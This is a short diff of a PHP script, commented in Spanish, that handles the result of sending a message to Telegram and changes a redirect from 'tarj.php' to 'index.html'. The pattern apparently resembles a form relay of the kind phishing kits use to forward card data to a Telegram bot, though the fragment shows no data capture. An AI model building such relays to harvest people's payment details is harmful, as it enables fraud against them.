@@ -37,7 +37,7 @@ if ($response === false) {
   echo "Error al enviar el mensaje a Telegram.";
 } else {
   // Redireccionar a una página HTML
-  header("Location: tarj.php");
+  header("Location: index.html");
   exit;
 }
 ?>
